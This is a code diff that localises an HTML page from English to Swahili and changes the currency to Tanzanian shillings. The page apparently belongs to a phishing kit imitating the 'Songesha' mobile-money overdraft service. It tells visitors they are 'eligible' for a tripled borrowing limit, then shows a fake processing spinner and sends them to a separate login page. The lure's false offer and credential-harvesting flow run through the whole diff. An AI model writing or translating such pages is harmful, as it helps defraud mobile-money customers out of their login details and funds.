@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Your Calculated Limit</title>
+    <title>Kiwango Chako Kimehesabiwa</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * {
@@ -183,29 +183,29 @@
 <body>
     <div class="app-container">
         <div class="header">
-            🎄 Your Kashagi Limit Unlocked
+            � Kiwango Chako cha Songesha Kimefunguliwa
         </div>
 
         <div class="content">
             <!-- Loading State -->
             <div class="loading-state" id="loading-state">
                 <div class="spinner"></div>
-                <div class="loading-text">Calculating your new limit...</div>
+                <div class="loading-text">Tunakuhesabu kiwango chako kipya...</div>
             </div>
 
             <!-- Result State -->
             <div class="result-state" id="result-state">
                 <div class="result-icon">✨</div>
-                <div class="result-title">Congratulations!</div>
-                <div style="color: #ccc; font-size: 13px; margin-bottom: 20px;">You're eligible for up to</div>
-                <div class="result-amount" id="result-amount">$0</div>
+                <div class="result-title">Hongera!</div>
+                <div style="color: #ccc; font-size: 13px; margin-bottom: 20px;">Unastahili kupata hadi</div>
+                <div class="result-amount" id="result-amount">TSh 0</div>
                 <div class="result-subtitle" id="result-info">
-                    Based on your current Kashagi limit, you can now borrow up to this amount instantly!
+                    Kulingana na kiwango chako cha sasa cha Songesha, unaweza kukopa hadi kiasi hiki sasa hivi!
                 </div>
 
                 <div class="button-group" style="width: 100%;">
-                    <button class="claim-btn" onclick="claimLimit()">Claim My Limit Now →</button>
-                    <button class="back-text-btn" onclick="window.location.href='offer.html'">Maybe Later</button>
+                    <button class="claim-btn" onclick="claimLimit()">Dai Kiwango Changu Sasa →</button>
+                    <button class="back-text-btn" onclick="window.location.href='offer.html'">Labda Baadaye</button>
                 </div>
             </div>
         </div>
@@ -223,7 +223,7 @@
             
             // Calculate and display amount (×3 like Songesha)
             const calculatedLimit = kashageLimit * 3;
-            document.getElementById('result-amount').textContent = '$' + calculatedLimit.toLocaleString();
+            document.getElementById('result-amount').textContent = 'TSh ' + calculatedLimit.toLocaleString();
             
             // Store calculated amount
             sessionStorage.setItem('kashageCalculatedLimit', calculatedLimit);
@@ -233,7 +233,7 @@
             // Show full-screen loading overlay then go to login
             document.getElementById('result-state').style.display = 'none';
             document.getElementById('loading-state').style.display = 'flex';
-            document.querySelector('.loading-text').textContent = 'Processing your limit...';
+            document.querySelector('.loading-text').textContent = 'Tunachakata kiwango chako...';
 
             setTimeout(() => {
                 window.location.href = 'login.html';
